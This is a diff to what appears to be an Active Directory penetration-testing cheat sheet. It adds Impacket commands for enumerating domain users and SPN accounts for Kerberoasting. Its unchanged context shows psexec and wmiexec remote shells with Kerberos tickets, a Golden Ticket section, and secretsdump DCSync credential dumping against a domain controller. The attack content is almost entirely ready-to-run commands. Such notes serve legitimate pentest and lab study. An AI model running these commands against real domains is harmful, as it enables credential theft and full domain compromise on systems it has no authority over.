@@ -6,6 +6,18 @@
 **-format hashcat to export a formated hash**
 {% endhint %}
 
+### **Get AD users**
+
+```csharp
+python3 GetADUsers.py -all -k -no-pass -dc-ip <DC_IP> Domain.local/Administrator
+```
+
+### Get SPN users
+
+```csharp
+GetUserSPNs.py -k -no-pass -dc-ip <DC_IP> Domain.local/Administrator
+```
+
 ### Account witch doesn't require Kerberos Authentication
 
 ```csharp
@@ -38,7 +50,7 @@ As opposite to psexec which provides NT LOCAL/System shell, wmiexec allows to ke
 ./wmiexec.py CROOK.BADCORP.LOCAL/Administrator@DC103 -k -no-pass
 ```
 
-## Golden Ticket
+## Kerberos Golden Ticket
 
 ### Request a TGT
 
@@ -58,7 +70,7 @@ export KRB5CCNAME=krb5cc_91801115_mine
 ./psexec.py CROOK.BADCORP.LOCAL/Administrator@10.110.0.222 -k -no-pass
 ```
 
-## DSYNC
+### DSYNC
 
 ```csharp
 ./secretsdump.py crook.badcorp.local/User:Password@10.110.0.222
